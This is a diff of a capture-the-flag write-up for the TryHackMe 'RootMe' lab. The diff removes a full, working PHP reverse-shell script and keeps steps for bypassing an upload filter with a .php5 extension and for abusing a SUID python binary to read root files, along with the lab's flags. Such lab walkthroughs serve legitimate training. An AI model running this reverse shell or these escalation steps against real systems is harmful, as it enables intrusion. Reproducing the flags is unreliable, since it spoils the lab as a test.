@@ -47,199 +47,7 @@ Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/
 >DOWNLOADED: 9224 - FOUND: 3
 - Hidden directory is '/panel/'
 
-3. We can upload a payload and get a reverse shell. Save this payload to a file, change the port and ip to your machine's ip address and a port that's not being used.
-
-><?php
->// php-reverse-shell - A Reverse Shell implementation in PHP
->// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
->//
->// This tool may be used for legal purposes only.  Users take full responsibility
->// for any actions performed using this tool.  The author accepts no liability
->// for damage caused by this tool.  If these terms are not acceptable to you, then
->// do not use this tool.
->//
->// In all other respects the GPL version 2 applies:
->//
->// This program is free software; you can redistribute it and/or modify
->// it under the terms of the GNU General Public License version 2 as
->// published by the Free Software Foundation.
->//
->// This program is distributed in the hope that it will be useful,
->// but WITHOUT ANY WARRANTY; without even the implied warranty of
->// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
->// GNU General Public License for more details.
->//
->// You should have received a copy of the GNU General Public License along
->// with this program; if not, write to the Free Software Foundation, Inc.,
->// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
->//
->// This tool may be used for legal purposes only.  Users take full responsibility
->// for any actions performed using this tool.  If these terms are not acceptable to
->// you, then do not use this tool.
->//
->// You are encouraged to send comments, improvements or suggestions to
->// me at pentestmonkey@pentestmonkey.net
->//
->// Description
->// -----------
->// This script will make an outbound TCP connection to a hardcoded IP and port.
->// The recipient will be given a shell running as the current user (apache normally).
->//
->// Limitations
->// -----------
->// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
->// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
->// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
->//
->// Usage
->// -----
->// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
->
->set_time_limit (0);
->$VERSION = "1.0";
->$ip = '127.0.0.1';  // CHANGE THIS
->$port = 1234;       // CHANGE THIS
->$chunk_size = 1400;
->$write_a = null;
->$error_a = null;
->$shell = 'uname -a; w; id; /bin/sh -i';
->$daemon = 0;
->$debug = 0;
->
->//
->// Daemonise ourself if possible to avoid zombies later
->//
->
->// pcntl_fork is hardly ever available, but will allow us to daemonise
->// our php process and avoid zombies.  Worth a try...
->if (function_exists('pcntl_fork')) {
->	// Fork and have the parent process exit
->	$pid = pcntl_fork();
->	
->	if ($pid == -1) {
->		printit("ERROR: Can't fork");
->		exit(1);
->	}
->	
->	if ($pid) {
->		exit(0);  // Parent exits
->	}
->
->	// Make the current process a session leader
->	// Will only succeed if we forked
->	if (posix_setsid() == -1) {
->		printit("Error: Can't setsid()");
->		exit(1);
->	}
->
->	$daemon = 1;
->} else {
->	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
->}
->
->// Change to a safe directory
->chdir("/");
->
->// Remove any umask we inherited
->umask(0);
->
->//
->// Do the reverse shell...
->//
->
->// Open reverse connection
->$sock = fsockopen($ip, $port, $errno, $errstr, 30);
->if (!$sock) {
->	printit("$errstr ($errno)");
->	exit(1);
->}
->
->// Spawn shell process
->$descriptorspec = array(
->   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
->   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
->   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
->);
->
->$process = proc_open($shell, $descriptorspec, $pipes);
->
->if (!is_resource($process)) {
->	printit("ERROR: Can't spawn shell");
->	exit(1);
->}
->
->// Set everything to non-blocking
->// Reason: Occsionally reads will block, even though stream_select tells us they won't
->stream_set_blocking($pipes[0], 0);
->stream_set_blocking($pipes[1], 0);
->stream_set_blocking($pipes[2], 0);
->stream_set_blocking($sock, 0);
->
->printit("Successfully opened reverse shell to $ip:$port");
->
->while (1) {
->	// Check for end of TCP connection
->	if (feof($sock)) {
->		printit("ERROR: Shell connection terminated");
->		break;
->	}
->
->	// Check for end of STDOUT
->	if (feof($pipes[1])) {
->		printit("ERROR: Shell process terminated");
->		break;
->	}
->
->	// Wait until a command is end down $sock, or some
->	// command output is available on STDOUT or STDERR
->	$read_a = array($sock, $pipes[1], $pipes[2]);
->	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
->
->	// If we can read from the TCP socket, send
->	// data to process's STDIN
->	if (in_array($sock, $read_a)) {
->		if ($debug) printit("SOCK READ");
->		$input = fread($sock, $chunk_size);
->		if ($debug) printit("SOCK: $input");
->		fwrite($pipes[0], $input);
->	}
->
->	// If we can read from the process's STDOUT
->	// send data down tcp connection
->	if (in_array($pipes[1], $read_a)) {
->		if ($debug) printit("STDOUT READ");
->		$input = fread($pipes[1], $chunk_size);
->		if ($debug) printit("STDOUT: $input");
->		fwrite($sock, $input);
->	}
->
->	// If we can read from the process's STDERR
->	// send data down tcp connection
->	if (in_array($pipes[2], $read_a)) {
->		if ($debug) printit("STDERR READ");
->		$input = fread($pipes[2], $chunk_size);
->		if ($debug) printit("STDERR: $input");
->		fwrite($sock, $input);
->	}
->}
->
->fclose($sock);
->fclose($pipes[0]);
->fclose($pipes[1]);
->fclose($pipes[2]);
->proc_close($process);
->
->// Like print, but does nothing if we've daemonised ourself
->// (I can't figure out how to redirect STDOUT like a proper daemon)
->function printit ($string) {
->	if (!$daemon) {
->		print "$string\n";
->	}
->}
->
->?> 
->
->
+3. We can upload a payload and get a reverse shell. Download the file that's included with this writeup, extract the file, and change the port and ip to your machine's ip address and a port that's not being used.
 
 4. If we save this as a .php file and try to upload it, we find that we're allowed to upload .php files. There are several ways of bypassing this, but the easiest way is to just change the file extension so that it'll get accepted into the server and so that it'll run when we try to run it. For example, payload.jpg won't work because the .jpg won't run. So we bypass it by simple changing the extension to .php5, which is another version of php that is not blocked by the server. After uploading, go to "<target ip address>/uploads" - which we found earlier with dirb - and make sure that the file has been uploaded
 
@@ -250,58 +58,58 @@ Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/
 7. We're given the name of the file that contains the flag "user.txt", so we simple use the find command: "find / -type f -name user.txt" and we see that the file is at /var/www/user.txt and when we cat it we find that the flag is THM{y0u_g0t_a_sh3ll}
 
 8. Now we need to escalate our privileges to root. We're asked to search for files with the suid permission set - which lets any user execute the file with the permissions of the owner of the file - and find any files that are supicious. To do this we use find again: "find / -perm /4000 2> /dev/null" (we use "2> /dev/null" to get rid of any errors, such as permission errors for files we're not able to access)
->/usr/lib/dbus-1.0/dbus-daemon-launch-helper
->/usr/lib/snapd/snap-confine
->/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
->/usr/lib/eject/dmcrypt-get-device
->/usr/lib/openssh/ssh-keysign
->/usr/lib/policykit-1/polkit-agent-helper-1
->/usr/bin/traceroute6.iputils
->/usr/bin/newuidmap
->/usr/bin/newgidmap
->/usr/bin/chsh
->/usr/bin/python
->/usr/bin/at
->/usr/bin/chfn
->/usr/bin/gpasswd
->/usr/bin/sudo
->/usr/bin/newgrp
->/usr/bin/passwd
->/usr/bin/pkexec
->/snap/core/8268/bin/mount
->/snap/core/8268/bin/ping
->/snap/core/8268/bin/ping6
->/snap/core/8268/bin/su
->/snap/core/8268/bin/umount
->/snap/core/8268/usr/bin/chfn
->/snap/core/8268/usr/bin/chsh
->/snap/core/8268/usr/bin/gpasswd
->/snap/core/8268/usr/bin/newgrp
->/snap/core/8268/usr/bin/passwd
->/snap/core/8268/usr/bin/sudo
->/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
->/snap/core/8268/usr/lib/openssh/ssh-keysign
->/snap/core/8268/usr/lib/snapd/snap-confine
->/snap/core/8268/usr/sbin/pppd
->/snap/core/9665/bin/mount
->/snap/core/9665/bin/ping
->/snap/core/9665/bin/ping6
->/snap/core/9665/bin/su
->/snap/core/9665/bin/umount
->/snap/core/9665/usr/bin/chfn
->/snap/core/9665/usr/bin/chsh
->/snap/core/9665/usr/bin/gpasswd
->/snap/core/9665/usr/bin/newgrp
->/snap/core/9665/usr/bin/passwd
->/snap/core/9665/usr/bin/sudo
->/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
->/snap/core/9665/usr/lib/openssh/ssh-keysign
->/snap/core/9665/usr/lib/snapd/snap-confine
->/snap/core/9665/usr/sbin/pppd
->/bin/mount
->/bin/su
->/bin/fusermount
->/bin/ping
+>/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
+>/usr/lib/snapd/snap-confine \
+>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic \
+>/usr/lib/eject/dmcrypt-get-device \
+>/usr/lib/openssh/ssh-keysign \
+>/usr/lib/policykit-1/polkit-agent-helper-1 \
+>/usr/bin/traceroute6.iputils \
+>/usr/bin/newuidmap \
+>/usr/bin/newgidmap \
+>/usr/bin/chsh \
+>/usr/bin/python \
+>/usr/bin/at \
+>/usr/bin/chfn \
+>/usr/bin/gpasswd \
+>/usr/bin/sudo \
+>/usr/bin/newgrp \
+>/usr/bin/passwd \
+>/usr/bin/pkexec \
+>/snap/core/8268/bin/mount \
+>/snap/core/8268/bin/ping \
+>/snap/core/8268/bin/ping6 \
+>/snap/core/8268/bin/su \
+>/snap/core/8268/bin/umount \
+>/snap/core/8268/usr/bin/chfn \
+>/snap/core/8268/usr/bin/chsh \
+>/snap/core/8268/usr/bin/gpasswd \
+>/snap/core/8268/usr/bin/newgrp \
+>/snap/core/8268/usr/bin/passwd \
+>/snap/core/8268/usr/bin/sudo \
+>/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
+>/snap/core/8268/usr/lib/openssh/ssh-keysign \
+>/snap/core/8268/usr/lib/snapd/snap-confine \
+>/snap/core/8268/usr/sbin/pppd \
+>/snap/core/9665/bin/mount \
+>/snap/core/9665/bin/ping \
+>/snap/core/9665/bin/ping6 \
+>/snap/core/9665/bin/su \
+>/snap/core/9665/bin/umount \
+>/snap/core/9665/usr/bin/chfn \
+>/snap/core/9665/usr/bin/chsh \
+>/snap/core/9665/usr/bin/gpasswd \
+>/snap/core/9665/usr/bin/newgrp \
+>/snap/core/9665/usr/bin/passwd \
+>/snap/core/9665/usr/bin/sudo \
+>/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper \
+>/snap/core/9665/usr/lib/openssh/ssh-keysign \
+>/snap/core/9665/usr/lib/snapd/snap-confine \
+>/snap/core/9665/usr/sbin/pppd \
+>/bin/mount \
+>/bin/su \
+>/bin/fusermount \
+>/bin/ping \
 >/bin/umount
 
 9. Looking through the results, we see nothing suspicious until we see python. Python's an interpreter for the python programming language, and setting SUID on it makes no sense because there's no reason to run it as root; it'll produce the same output no matter who runs it. We check if that's the binary that the challenge is looking for, and it is. "/usr/bin/python"
@@ -311,7 +119,7 @@ Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/
 11. I tried writing the code inside the shell we got from the reverse shell, but python and vim were acting weird, so I instead wrote the code inside the attacker machine, uploaded it to the server just like we did with the reverse php file, and used "find / -type d -name ```*uploads*``` 2> /dev/null" to find where the files we uploaded were located. I needed to find the location because I couldn't just execute the python file with curl like we did with the php payload. I found that the files were in /var/www/html/uploads
 
 12. After this, I wrote a basic python script to print out the contents or /root
->#!/usr/bin/python
+>#!/usr/bin/python \
 >import os
 >
 >print(os.listdir('/root'))
@@ -319,10 +127,10 @@ Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/
 13. I then uploaded that to the server and used "/usr/bin/python /var/www/html/uploads/<filename>", and I see that root.txt is indeed in /root
 
 14. Finally, to print out the contents of root.txt, I wrote this script
->#!/usr/bin/python
+>#!/usr/bin/python \
 >import os
 >
->file = open('/root/root.txt', 'r')
+>file = open('/root/root.txt', 'r') \
 >print(file.read())
 
 The last flag is THM{pr1v1l3g3_3sc4l4t10n}
